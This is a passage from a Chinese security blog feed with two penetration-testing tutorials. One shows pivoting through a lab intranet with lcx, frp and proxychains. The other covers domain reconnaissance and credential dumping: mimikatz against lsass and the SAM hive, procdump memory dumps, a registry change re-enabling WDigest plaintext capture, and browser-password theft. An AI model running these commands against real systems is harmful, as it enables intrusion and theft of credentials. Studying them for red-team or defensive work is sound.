class="code"><pre><span class="line">攻击机kali</span><br><span class="line"></span><br><span class="line">内网：</span><br><span class="line">web1: 10.10.10.13(内网地址) （192.168.8.x)外网地址</span><br><span class="line">DC: 10.10.10.11（不出网）</span><br><span class="line">cilent1: 10.10.10.14(内网地址，不出网)</span><br></pre></td></tr></table></figure><p>从这可以看到我们如果想要拿下cilent1，可以通过web1主机去。因为kali又不能与cilent1通讯。所以需要搭建代理。</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><strong>目标</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">端口转发：**比如我要控制web1的桌面，需要通过3389来控制，但是防火墙不让外部地址有3389，但是可以4444的话，那我就可以使用端口转发。使得kali访问web1的4444端口就相当于访问3389.。</span><br><span class="line"></span><br><span class="line">**端口映射：**但是如果我想使用的是cilent的3389，那我可以将cilent的3389映射到web1的4444</span><br></pre></td></tr></table></figure><h3 id="1-1-使用lcx进行端口转发"><a href="#1-1-使用lcx进行端口转发" class="headerlink" title="1.1 使用lcx进行端口转发"></a><strong>1.1 使用lcx进行端口转发</strong></h3><p>web1执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -tran 4444 127.0.0.1 3389</span><br></pre></td></tr></table></figure><p>攻击机执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.8.x:4444</span><br></pre></td></tr></table></figure><h3 id="1-2-使用lcx进行端口映射"><a href="#1-2-使用lcx进行端口映射" class="headerlink" title="1.2 使用lcx进行端口映射"></a>1.2 使用lcx进行端口映射</h3><p>web1执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -tran 4444 10.10.10.14 3389</span><br></pre></td></tr></table></figure><p>攻击机执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.8.x:4444</span><br></pre></td></tr></table></figure><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h2 id="2-场景二"><a href="#2-场景二" class="headerlink" title="2.场景二"></a>2.场景二</h2><p>但是如果web1没有外网地址（192.168.8.x)，只有内网地址（10.10.10.13），但是出网，可以使用frp以及vps进行搭建隧道。</p><p>这种场景搭建一级代理。</p><p>假设vps的地址为 43.143.93.88</p><p><strong>目标：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">端口转发：我要控制web1的3389，但是我只能允许4444进入。那么就可以将4444的流量转发到3389。</span><br><span class="line"></span><br><span class="line">想ssh登录进入cilent1</span><br></pre></td></tr></table></figure><p>frp搭建一级代理思路。在vps和web1之间搭建一个隧道，搭建这个隧道的时候对于vps会涉及到两个端口。一个是默认的7000连接frp的端口，一个是用户自定义的隧道端口。新手可能会很容易搞混这两个端口。默认的7000端口我们不用在意，只管客户端设置的remote_port.</p><h3 id="2-1-使用frp搭建一级代理"><a href="#2-1-使用frp搭建一级代理" class="headerlink" title="2.1 使用frp搭建一级代理"></a>2.1 使用frp搭建一级代理</h3><p>将Vps作为服务端。把frps上传，并设置frps.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><p>web1作为客户端，配置frpc.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 43.143.93.88</span><br><span class="line">aerver_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">remote_port = 4444 #vps与web1之间的隧道端口，所有流量都通过vps的4444端口到达web1的4444端口</span><br><span class="line">plugin = socks5#vps可作为一个socks5的代理服务器。</span><br></pre></td></tr></table></figure><p>plugin是一个插件，赋值socks5，意思是可以建立socks5代理服务器。什么意思，就是可以把它当做一个中间服务器进行传输。当然你可以都加，plugin &#x3D; socks5。</p><p>然后在kali上将数据包流量扔到隧道里面。kali自带proxychains，配置proxychains.conf设置代理服务器:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 43.143.93.88 4444</span><br></pre></td></tr></table></figure><p>再运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychain rdesktop 10.10.10.13:3389</span><br><span class="line">或者</span><br><span class="line">proxychain ssh root@10.10.10.14</span><br></pre></td></tr></table></figure><p>这个就是把这个数据包的流量扔到vps这个代理服务器上，端口是4444，然后这个流量就会到达目标主机进行解析。</p><h2 id="3-场景三"><a href="#3-场景三" class="headerlink" title="3.场景三"></a>3.场景三</h2><p>假设现在有另外一个主机cilent2 内网地址是10.10.20.5,可以与client1连接。但是我想在攻击机上ssh连接client2.</p><p>那么现在就必须再搭条隧道进入cilent1与cilent2所在的网段；</p><img src="/2023/11/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/1.png" class=""><h3 id="3-1-frp搭建二级代理"><a href="#3-1-frp搭建二级代理" class="headerlink" title="3.1 frp搭建二级代理"></a>3.1 frp搭建二级代理</h3><p>将vps与web1作为代理服务器</p><p>vps的frps配置不变</p><h4 id="web1-配置"><a href="#web1-配置" class="headerlink" title="web1 配置"></a><strong>web1 配置</strong></h4><p>frpc.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 43.143.93.88</span><br><span class="line">aerver_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp </span><br><span class="line">local_port = 10808 #将1080隧道接受到的流量转发到10808,要转发流量，使用tcp协议。所以type=tcp</span><br><span class="line">remote_port = 1080</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure><p>这样第一条隧道搭建完毕。</p><p>同时它也要作为一个代理服务器，那么配置frps.ini,能在web1与cilent1之间建立一个隧道.成为第二条隧道</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 10.10.10.13</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><h4 id="cilent1配置"><a href="#cilent1配置" class="headerlink" title="cilent1配置"></a>cilent1配置</h4><p>frpc.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 10.10.10.13</span><br><span class="line">aerver_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp #为什么要type=tcp,因为在第一条隧道的时候，数据包是tcp协议转发到10808的。</span><br><span class="line">remote_port = 10808</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure><p>到此两条隧道搭建完毕。</p><h4 id="kali攻击"><a href="#kali攻击" class="headerlink" title="kali攻击"></a>kali攻击</h4><p>kali 可以通过proxchains来实现将流量包转发到vps这个第一个代理服务器，然后就会传到cilent1。</p><p>proxychains.conf配置好之后，就可以运行下面命令连接cilent2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh root@10.10.20.9</span><br></pre></td></tr></table></figure><p>三级代理一样的，把cilent2加个frps.</p><h1 id="三、frp的其他使用补充"><a href="#三、frp的其他使用补充" class="headerlink" title="三、frp的其他使用补充"></a>三、frp的其他使用补充</h1><p>frp进行内网穿透的时候，还有其他配置，比如，搭好隧道之后，把流量转发到22端口，就可以连接内网的22，将流量转发到其他部署有网站的端口，就可以通过vps访问到内网网站。但是一定要注意type.想连接22，就走tcp，想web，就可以走tcp也可以http.只不过http还得布置域名。</p><p>frps服务端不变。</p><p>主要是客户端frpc.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_ip = 43.143.93.88</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[ssh]</span><br><span class="line">type = tcp</span><br><span class="line">local_port =22</span><br><span class="line">remote_port = 1080</span><br><span class="line"></span><br><span class="line">[web]</span><br><span class="line">type = tcp</span><br><span class="line">local_port =80 #或者其他站点端口</span><br><span class="line">remote_port = 4444</span><br></pre></td></tr></table></figure><p>上述配置就可以直接通过操作43.143.93.88的相应端口来达到相关服务，比如要连接这个客户端的ssh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 1080 root@43.143.93.88</span><br></pre></td></tr></table></figure><p>要访问这个客户端内网的网站，直接浏览器访问<a href="http://43.143.93.88:4444就能访问。">http://43.143.93.88:4444就能访问。</a></p><p>但是如果是配置了代理服务器，搞了隧道，也就是frpc.ini的配置如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_ip = 43.143.93.88</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[ssh]</span><br><span class="line">remote_port = 1080</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure><p>没有type &#x3D; tcp 就不能访问。就算你配置了local_port &#x3D; 22 或者88,都不能成功转发流量，也就是说，要进行端口转发流量必须加上type。</p><p>如果没加，就像上面一样，那么就是只搭建了一个代理服务器。</p><p>通过代理插件来实现。代理插件kali有proxychain，相关操作也有。代理插件或者软件的作用就是将数据包流量发送到代理服务器。</p><p>kali 直接配置文件，使用时就在命令前加上proxychain .</p><p>Windows可以使用proxifier。在设置代理服务器的时候，就可以设置 43.143.93.88  1080</p><p>再设置相应的规则就可以将流量经过代理服务器。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h1&gt;&lt;p&gt;为什么要进行代理搭建？因为目标主机会把一些可利用的端口给禁了，或者说内网 的防火墙不允许这些端口出现，那么这时候就需要搭建一</summary>
      
    
    
    
    <category term="内网渗透" scheme="https://ruan0423.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="代理" scheme="https://ruan0423.github.io/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透-信息收集(精简详细篇)</title>
    <link href="https://ruan0423.github.io/2023/10/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%B2%BE%E7%AE%80%E8%AF%A6%E7%BB%86%E7%AF%87/"/>
    <id>https://ruan0423.github.io/2023/10/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%B2%BE%E7%AE%80%E8%AF%A6%E7%BB%86%E7%AF%87/</id>
    <published>2023-10-30T04:29:45.000Z</published>
    <updated>2023-11-01T11:01:39.026Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>上一篇我们已经讲了在Windows 主机里面信息探测的一些命令，但是有很多很杂，这里就把最常用的列在这里就行。</p><h1 id="二、本机基础信息收集"><a href="#二、本机基础信息收集" class="headerlink" title="二、本机基础信息收集"></a>二、本机基础信息收集</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.查看当前用户、权限。whoami  /all</span><br><span class="line"></span><br><span class="line">2.查看网络配置`ipconfig /all`</span><br><span class="line"></span><br><span class="line">3.查看主机路由信息route print</span><br><span class="line"></span><br><span class="line">4.查看操作系统信息systeminfo</span><br><span class="line">5.查看端口连接信息：netstat -ano</span><br><span class="line">6.查看当前会话列表：net session</span><br><span class="line">7.查看网络共享信息：net share</span><br><span class="line">8.查看已连接的网络共享： net use</span><br><span class="line">9.查看当前进程信息：tasklist ,tasklist /svc (可通过这个进行杀软进程识别，)</span><br><span class="line">10.查看计划任务：schtasks /query /v /fo list</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>wmic</strong></p><p>wmic 是微软为了方便管理规范的一个命令行工具，使用它可以获取更多进程和服务的详细信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1.获取主机进程信息，并过滤进程的路径，名称和ID</span><br><span class="line">wmic process get name ,processid,executablepath</span><br><span class="line"></span><br><span class="line">2.获取具体某个进程的信息,就加个判断where语句就行</span><br><span class="line">wmic process where name=&quot;dwm.exe&quot; get executablepath</span><br><span class="line"></span><br><span class="line">3.查看服务信息,并过滤出服务的名称，路径，创建时间，运行状态。查看具体某项服务的具体信息和上述一样</span><br><span class="line">wmic service get caption,name,pathname,startname,state</span><br><span class="line"></span><br><span class="line">4.查看系统补丁安装信息，可通过这个来进行提劝收集。这可列出主机补丁列表，包括链接，名称，描述，编号，时间</span><br><span class="line">wmic qfe get caption ,csname ,description,hotfixid ,installedon</span><br><span class="line"></span><br><span class="line">5.查看主机上安装的软件信息，过滤出应用名称和版本</span><br><span class="line">wmic product get caption ,version</span><br><span class="line"></span><br><span class="line">6.查看自启程序信息</span><br><span class="line">wmic startup get caption ,command ,location , user</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="三、域内信息收集"><a href="#三、域内信息收集" class="headerlink" title="三、域内信息收集"></a>三、域内信息收集</h1><p>域内信息收集首先是判断是否存在域，这不说了，下面介绍常使用的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1.net group /domain</span><br><span class="line">net group &quot;xx&quot; /domain</span><br><span class="line"></span><br><span class="line">net user /domain</span><br><span class="line">net user &#x27;xx&#x27; /domain</span><br><span class="line"></span><br><span class="line">2.上面的命令用于收集域内组和用户的信息，另外：</span><br><span class="line">wmic useraccount get caption , domain, description</span><br><span class="line">可以获得域内所有用户的sid,所属域，描述信息。当然这个命令只能是域用户才能使用。</span><br><span class="line"></span><br><span class="line">3.查看域内密码策略，有什么用？根据这些密码策略可以构造字典进行爆破</span><br><span class="line">net account /domain</span><br><span class="line"></span><br><span class="line">4.查看域控制器，获取域控制器的主机名</span><br><span class="line">net group &quot;domain controllers&quot; /domain</span><br><span class="line">nltest /DCLIST:traveler.com </span><br><span class="line"></span><br><span class="line">5.知道域域控制器之后，当然还要知道他的地址，使用ping ，可以ping主机名，可以ping域名，当然其实域控基本上就是作为域的DNS服务器，主机的DNS解析就是域的地址。</span><br><span class="line"></span><br><span class="line">6.然后我们还可以看看域的信任关系，为啥呢？一个用户只能访问自己本地域的信息，但是它想出轨去访问其他域的信息的话就需要建立域信任：</span><br><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure><h1 id="四、内网资源探测"><a href="#四、内网资源探测" class="headerlink" title="四、内网资源探测"></a>四、内网资源探测</h1><p>既然主机的信息和域的信息探测差不多了，那么接下来就是探测一下资源啦，这里基本上是通过各种扫描技术来探测，主要为了后续的攻击，探测出主机的操作系统，端口啊，端口上的服务啊，当前的版本的漏洞啊啥的。</p><h2 id="1-探测内网存活主机"><a href="#1-探测内网存活主机" class="headerlink" title="1.探测内网存活主机"></a>1.探测内网存活主机</h2><p>在进行探测之前肯定是先搭建内网代理的，这里就不讲，怎么搭建代理隧道见其他章节。</p><p>主机探测主要是通过一些协议，通常是ICMP。NeTBIOS,UDP，ARP，SNMP.SMB .协议很多，所以探索出存活主机的方式有很多。</p><h3 id="1-1基于ICMP探测"><a href="#1-1基于ICMP探测" class="headerlink" title="1.1基于ICMP探测"></a>1.1基于ICMP探测</h3><p>一看到ICMP是吧，就想到ping ，是的，可以使用for 循环ping c段的主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) do @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure><h3 id="1-2基于NetBIOS-网络基本输入、输出系统-探测"><a href="#1-2基于NetBIOS-网络基本输入、输出系统-探测" class="headerlink" title="1.2基于NetBIOS (网络基本输入、输出系统) 探测"></a>1.2基于NetBIOS (网络基本输入、输出系统) 探测</h3><p>上传nbtscan.exe到目标主机，地址<a href="http://unixwiz.net/tools/nbtscan.html">http://unixwiz.net/tools/nbtscan.html</a></p><p><code>执行nbtscan.exe 10.10.10.0/24</code></p><h3 id="1-3-基于UDP探测"><a href="#1-3-基于UDP探测" class="headerlink" title="1.3 基于UDP探测"></a>1.3 基于UDP探测</h3><p>kali自带一个 unicornscan ,它使用udp协议探测存活主机</p><p><code>unicornscan -mU 10.10.10.0/24</code></p><h3 id="1-4-基于ARP协议"><a href="#1-4-基于ARP协议" class="headerlink" title="1.4 基于ARP协议"></a>1.4 基于ARP协议</h3><p>arp-scan 是一个快速扫描工具，很快，kali 自带，Windows需要上传</p><p><code>arp-scan.exe -t 10.10.10.0/24</code> </p><h2 id="2-探测端口"><a href="#2-探测端口" class="headerlink" title="2.探测端口"></a>2.探测端口</h2><h3 id="2-1-telnet-探测"><a href="#2-1-telnet-探测" class="headerlink" title="2.1 telnet 探测"></a>2.1 telnet 探测</h3><p>telnet ip port 可以检测该端口是否打开</p><h3 id="2-2-nmap"><a href="#2-2-nmap" class="headerlink" title="2.2 nmap"></a>2.2 nmap</h3><p><code>nmap -sS -p- ip</code></p><h3 id="2-3-获取banner信息"><a href="#2-3-获取banner信息" class="headerlink" title="2.3 获取banner信息"></a>2.3 获取banner信息</h3><p><code>banner信息中可能含有一些敏感信息</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -nv ip port</span><br><span class="line">telnet ip port</span><br><span class="line">nmap --script=banner -p port ip</span><br></pre></td></tr></table></figure><h2 id="3-用户凭据收集"><a href="#3-用户凭据收集" class="headerlink" title="3.用户凭据收集"></a>3.用户凭据收集</h2><p>在内网渗透中，被攻击的主机通常只是作为跳板进行横向渗透，然而横向的一些攻击方法通常需要吸纳获得域内用户的密码。</p><p>mimikazt地址<a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p><p>百度网盘：链接：<a href="https://pan.baidu.com/s/166t4E-SfvHyDwuxlfq6wTw%E6%8F%90%E5%8F%96%E7%A0%81%EF%BC%9A3azc">https://pan.baidu.com/s/166t4E-SfvHyDwuxlfq6wTw提取码：3azc</a></p><h3 id="3-1-获取域内主机的密码和哈希值"><a href="#3-1-获取域内主机的密码和哈希值" class="headerlink" title="3.1 获取域内主机的密码和哈希值"></a>3.1 获取域内主机的密码和哈希值</h3><p>前言：</p><p>Windows的密码是存在SAM文件中的，这个文件位于%Systemroot%&#x2F;system32&#x2F;config目录下，这个文件包含了用户的账号密码。在用户登录时会将用户输入的账号密码与这个文件进行匹配。</p><p>那是怎么进行匹配的呢？那肯定还是要有进程是吧，这个进程就是lsass.exe ，当用户在登录界面输入账号密码后，这些东西就会存在进程的内存之中，那么好家伙，是不是我只要能读取这个内存那岂不是就OK了，但是这个操作时要权限滴，所以啊，提圈很重要，现在假设有权限了。</p><p>有了这么个东西叫做<strong>Mimikatz</strong> ,Mimikatz 是一款功能强大的凭据转储开源程序，可以帮助测试人员提升进程权限，注入进程，读取进程内存。</p><p>接下来要搞主机的密码我们就用这个工具去搞</p><h4 id="1-读取lsass进程内存获取密码"><a href="#1-读取lsass进程内存获取密码" class="headerlink" title="1.读取lsass进程内存获取密码"></a><strong>1.读取lsass进程内存获取密码</strong></h4><p><strong>在线模式：</strong></p><p>上传mimikatz到主机，执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</span><br><span class="line"></span><br><span class="line">#privilege::debug 用于提权至debugprivilege权限，这个权限就可以导出内容了</span><br><span class="line">#sekurlsa::logonpasswords 导出用户凭据</span><br></pre></td></tr></table></figure><p><strong>离线模式：</strong></p><p>离线模式就是，将进程的内容转储在一个文件上，然后再进行导出用户凭据，那么转储的工具有哪些呢？有OutMinidump.ps1、Procdump、sharpdump 。通常使用微软官方提供的prodump </p><p>在目标机器上上传prodump 执行 <code>prodump.exe -accepteula -ma lsass.dmp</code></p><p>这样就将lsass内存转储了，然后再执行：<br><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot;  &quot;sekurlsa::logonpasswords full&quot; exit</code></p><p>#sekurlsa::minidump lsass.dump是加载内存文件</p><p><strong>注意：</strong></p><p>但是微软在2014年为了防止从内存中提取密码，禁用了WDigest 功能，使得Win sever2012及以上版本默认关闭Wdigest功能；但是可以通过修改注册表开启Wdigest功能，当下次登录或者注销登录的时候就可以重新获得密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#开启Wdigest</span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class="line"></span><br><span class="line">#关闭WDigest</span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><h4 id="2-读取SAM文件获取密码"><a href="#2-读取SAM文件获取密码" class="headerlink" title="2.读取SAM文件获取密码"></a>2.读取SAM文件获取密码</h4><p>也是直接使用mimikatz </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit</span><br><span class="line"></span><br><span class="line">#privilege::dubug 提权至DebugPrivilege</span><br><span class="line"></span><br><span class="line">#token：：elevate 提权至system </span><br><span class="line"></span><br><span class="line">#lsadump:sam 读取本地sam文件</span><br></pre></td></tr></table></figure><p><strong>离线：</strong></p><p>为了防止SAM被脱裤直接被破解，window设置了秘钥，这个秘钥存在同目录下的SYSTEM文件中，所以要导出这两个文件（SAM和SYSTEM），但是呢这两个文件又是锁定的，又要借助工具才能导出，使用Invoke-NinjaCopy.ps1脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-NinjaCopy -path &quot;C:\windows\system32\config\SAM&quot; -LocalDestination C:\temp\SAM</span><br><span class="line">Invoke-NinCopy -path &quot;C:\windows\system32\config\SYSTEM&quot; -LocalDestination C:\temp\SYSTEM</span><br></pre></td></tr></table></figure><p>当然除了工具之外也可以在管理员权限下通过注册表保存的方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SAM sam.hive </span><br><span class="line">reg save HKLM\SYSTEM system.hive</span><br></pre></td></tr></table></figure><p>通过上述两个方式导出文件之后继续使用mimikatz来读取明文凭据信息</p><p><code>mimikatz.exe &quot;lsadump::sam /sam:sam.hive /system:system.hive&quot; exit</code></p><h1 id="五、主机软件中的凭据"><a href="#五、主机软件中的凭据" class="headerlink" title="五、主机软件中的凭据"></a>五、主机软件中的凭据</h1><p>有一些软件会自动把密码存储，这些密码哎嘿，你懂的。</p><h2 id="1-获取PDR远程桌面的凭据"><a href="#1-获取PDR远程桌面的凭据" class="headerlink" title="1.获取PDR远程桌面的凭据"></a>1.获取PDR远程桌面的凭据</h2><p>也是使用mimikatz来解密。</p><h2 id="2-可获取xshell等远程连接工具的密码"><a href="#2-可获取xshell等远程连接工具的密码" class="headerlink" title="2.可获取xshell等远程连接工具的密码"></a>2.可获取xshell等远程连接工具的密码</h2><h2 id="3-获取浏览器保存的登录密码"><a href="#3-获取浏览器保存的登录密码" class="headerlink" title="3.获取浏览器保存的登录密码"></a>3.获取浏览器保存的登录密码</h2><p>使用工具HackBrowserData。上传到主机，直接运行即可。</p><p>地址：<a href="https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.4.4">https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.4.4</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h1&gt;&lt;p&gt;上一篇我们已经讲了在Windows 主机里面信息探测的一些命令，但是有很多很杂，这里就把最常用的列在这里就行。&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    <category term="内网渗透" scheme="https://ruan0423.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="信息收集" scheme="https://ruan0423.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>python之re库，正则表达</title>
    <link href="https://ruan0423.github.io/2023/10/29/python%E4%B9%8Bre%E5%BA%93%EF%BC%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE/"/>
    <id>https://ruan0423.github.io/2023/10/29/python%E4%B9%8Bre%E5%BA%93%EF%BC%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE/</id>
    <published>2023-10-29T09:02:41.000Z</published>
    <updated>2023-10-29T14:22:46.514Z</updated>
    
